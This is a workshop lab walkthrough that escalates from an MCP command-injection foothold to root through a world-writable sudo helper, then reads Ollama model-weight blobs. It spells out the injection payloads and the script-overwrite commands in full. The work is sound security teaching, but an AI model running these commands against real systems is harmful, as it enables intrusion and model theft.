# Scenario 13: Privilege Escalation â Model-Weight Theft

> ★ **Shown at DEF CON RTV** - part of the guided demo/workshop. [All scenarios](index.md)

**Difficulty:** Advanced
**Time:** ~20 minutes
**Prerequisites:** Complete [Scenario 11](scenario-11.md) (MCP Tool Infection)
**Target:** ailab-dev:11434 (Ollama) → ailab-dev:3000 (MCP) → local root

## Background

The most valuable asset on an AI host is usually the **model itself** - the fine-tuned
weights a team spent money and proprietary data producing. This scenario is the honest
answer to *"can you steal the model?"*: not over the network, and not from the low-privilege
foothold the network gives you - but **yes, after a local privilege escalation**.

It is deliberately built around an *honest negative*. `aipostex` will not claim a weight theft
it cannot back up. The Ollama module tries the network paths, finds them genuinely closed, and
reports `reachable` - and that honest dead-end is the signpost that points to the real path:
a co-located service-account RCE plus a classic Linux `sudo` misconfiguration.

## The estate facts that make this real

On `ailab-dev` (172.16.50.10):

- **Ollama** serves the models but **exposes no blob download** - `GET /api/blobs/...` is not
  a route. There is no HTTP path to the raw weights.
- On disk the weight store `/usr/share/ollama/.ollama/models/blobs` is `0750 ollama:ollama`.
- The **MCP server** (`:3000`) exposes an unsandboxed `execute_command` tool and runs as the
  `devuser` service account. RCE here lands you as `devuser`.
- `devuser` is **deliberately not in the `ollama` group**, so from the MCP foothold the `0750`
  store is genuinely unreadable. No shortcut.
- An admin left an **`ollama-maintenance` helper** that `devuser` may run with **passwordless
  sudo** (`/etc/sudoers.d/ollama-maintenance`) - and left the helper itself **world-writable**
  (`0777 root:root` at `/usr/local/bin/ollama-maintenance.sh`). That is the GTFOBins-class
  misconfiguration: a root-run script anyone can rewrite.

The only path to the weights: **MCP RCE (devuser) → overwrite the world-writable helper →
`sudo` it → root → read the `0750` blob store → real GGUF bytes.**

## Objective

Prove model-weight theft end-to-end: escalate from the `devuser` MCP foothold to root and read
raw GGUF weight bytes off the `0750` Ollama blob store.

## Step 0 - The honest negative (the signpost)

```bash
aipostex ollama --target http://172.16.50.10:11434 \
    exfiltrate --model smollm2:135m --force-exploit --no-banner
```

**Expected:** `landed: reachable`. The finding states plainly that there is no HTTP blob
download and the on-disk store is root-only, so **weight theft requires a local privesc** - and
names the co-located MCP RCE as the pivot. This is aipostex refusing to overclaim; the negative
is the lead.

## Step 1 - Confirm the foothold (RCE as devuser)

```bash
aipostex mcp --target http://172.16.50.10:3000 \
    poison --mode cmd-inject --command 'id' --force-exploit --no-banner
```

**Expected:** `landed: execution-confirmed`; evidence shows `uid=1001(devuser)`. You have code
execution - as a low-privilege service account that **cannot** read the weight store.

## Step 2 - Escalate and steal the weights (readable path via `mcp shell`)

The clean, one-command-per-line way to drive the escalation is the interactive MCP console -
no nested shell quoting, each tool call is a single readable line:

```bash
aipostex mcp --target http://172.16.50.10:3000 shell --force-exploit
```

Then, at the `mcp>` prompt:

```text
mcp> :tools
mcp> execute_command {"command":"id"}
mcp> execute_command {"command":"ls -la /usr/share/ollama/.ollama/models/blobs"}
mcp> execute_command {"command":"echo '#!/bin/bash' > /usr/local/bin/ollama-maintenance.sh"}
mcp> execute_command {"command":"echo 'id' >> /usr/local/bin/ollama-maintenance.sh"}
mcp> execute_command {"command":"echo 'for f in /usr/share/ollama/.ollama/models/blobs/sha256-*; do echo BLOB $f; head -c 48 \"$f\" | xxd | head -2; break; done' >> /usr/local/bin/ollama-maintenance.sh"}
mcp> execute_command {"command":"sudo /usr/local/bin/ollama-maintenance.sh"}
mcp> :quit
```

**What you see:**

- `:tools` lists `execute_command` (the unsandboxed shell).
- `ls` on the blob store → **Permission denied** (the `0750` reality; devuser has no shortcut).
- The three `echo`s rewrite the world-writable helper with a payload of your choosing.
- `sudo ollama-maintenance.sh` runs the rewritten script **as root** (passwordless), printing
  `uid=0(root)` and the **GGUF magic bytes** (`47 47 55 46` = `GGUF`) from a real weight blob.

Root reading real model bytes off disk = the model is stolen.

### One-shot variant (non-interactive)

The same escalation via a single `cmd-inject` payload (handy for scripting; noisier on camera
because of the nested quoting):

```bash
aipostex mcp --target http://172.16.50.10:3000 \
    poison --mode cmd-inject --force-exploit --no-banner --command \
'printf "#!/bin/bash\nid\nfor f in /usr/share/ollama/.ollama/models/blobs/sha256-*; do echo BLOB $f; head -c 48 "$f" | xxd | head -2; break; done\n" > /usr/local/bin/ollama-maintenance.sh; sudo /usr/local/bin/ollama-maintenance.sh'
```

## Expected Finding

```json
{
  "finding_type": "model_weight_theft",
  "service": "mcp",
  "landed": "execution-confirmed",
  "stage": "own",
  "detail": "devuser MCP RCE -> world-writable sudo helper overwrite -> root -> read 0750 Ollama blob store",
  "evidence": "uid=0(root) ... BLOB /usr/share/.../sha256-... 47475546 GGUF ..."
}
```

**Landed grading:** `execution-confirmed` / `own` - the highest honest rung, earned only
because the evidence shows `uid=0` **and** real weight bytes off disk. Merely reaching the
helper or getting an accepted `sudo` without proving the read would not earn it.

## Real-World Impact

- **The model is the crown jewel.** Fine-tuned weights encode proprietary training data and
  months of spend. Exfiltrating them is IP theft, not just a config leak.
- **AI-specific reframing of a classic bug.** The `sudo` + world-writable-script primitive is
  GTFOBins 101; what makes it an *AI infra* finding is what it unlocks - the model. The generic
  variants (a `tar`/`systemd`/`cron` sudo entry) reach the same root; the target is the point.
- **Least-privilege that actually holds.** The lab is honest here: the network foothold and the
  service account genuinely *cannot* read the weights. The escalation is a real, separate step -
  which is exactly how a defender should think about blast radius.

## Cleanup

The escalation **overwrites `.10`'s `ollama-maintenance.sh`**. The estate self-heals on the next
`reset-wave` (re-provision reinstalls the pristine helper). To restore it immediately without a
full reset, re-run the idempotent installer block from
`lab-scripts/dev-workstation/provision.sh` (the "ollama-maintenance helper" section), which
rewrites the pristine helper and re-asserts `0777` + the sudoers rule.

## Follow-On

- [Scenario 12](scenario-12.md): fold this into the multi-vector campaign as the "own the host,
  take the model" finale.
- Reference: [Operator Field Manual](../reference/field-manual.md) - the whole-estate map, both
  headline chains, and the per-service `landed` grading in one place.
